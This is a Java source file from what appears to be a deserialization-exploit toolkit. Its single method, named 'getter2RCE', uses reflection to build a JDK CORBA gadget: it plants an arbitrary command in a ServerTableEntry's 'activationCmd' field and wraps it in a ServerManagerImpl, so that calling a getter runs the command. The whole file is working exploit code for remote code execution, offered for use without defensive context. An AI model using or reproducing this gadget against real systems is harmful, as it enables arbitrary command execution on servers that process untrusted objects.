package xyz.eki.marshalexp.gadget.jdk;

import com.sun.corba.se.impl.activation.ServerManagerImpl;
import com.sun.corba.se.impl.activation.ServerTableEntry;
import xyz.eki.marshalexp.utils.ReflectUtils;

import java.io.InputStream;
import java.io.OutputStream;
import java.util.HashMap;

public class GServerManagerImpl {

    //com.sun.corba.se.impl.activation.ServerManagerImpl.getActiveServers
    //com.sun.corba.se.impl.activation.ServerTableEntry.activate
    public static ServerManagerImpl getter2RCE(String cmd) throws Exception {
        ServerTableEntry entry = (ServerTableEntry) ReflectUtils.forceNewInstance(ServerTableEntry.class);
        ReflectUtils.setFieldValue(entry,"activationCmd",cmd);
        ReflectUtils.setFieldValue(entry,"state",2);
        ReflectUtils.setFieldValue(entry, "process", new Process() {
            @Override
            public OutputStream getOutputStream() {
                return null;
            }

            @Override
            public InputStream getInputStream() {
                return null;
            }

            @Override
            public InputStream getErrorStream() {
                return null;
            }

            @Override
            public int waitFor() throws InterruptedException {
                return 0;
            }

            @Override
            public int exitValue() {
                return 0;
            }

            @Override
            public void destroy() {

            }
        });
        ServerManagerImpl obj = (ServerManagerImpl) ReflectUtils.forceNewInstance(ServerManagerImpl.class);
        HashMap serverTable = new HashMap<>(256);
        serverTable.put(1,entry);
        ReflectUtils.setFieldValue(obj,"serverTable",serverTable);
        return obj;
    }
}
